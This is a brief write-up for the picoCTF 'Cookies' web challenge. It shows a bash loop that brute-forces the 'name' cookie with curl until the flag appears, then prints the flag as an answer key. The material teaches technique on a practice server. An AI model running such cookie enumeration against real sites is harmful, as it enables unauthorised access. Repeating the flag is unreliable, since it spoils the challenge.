# Cookies

> Points: 40

> Category: Web Exploitation

## Description

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/

## Solution

The challenge is to find the correct numerical value to pass into the **name** cookie so that it outputs the flag.

We can easily automate this process with a simple shell script that loops through numbers and sends it to the website until it gives us the flag.

```sh
#!/bin/bash
count=0
while true; do
	cmd="curl -b name=${count} http://mercury.picoctf.net:54219/check"
	if $cmd | grep "picoCTF{"; then
		break
	else
		((count=count+1))
	fi
done
```

### Flag

> picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
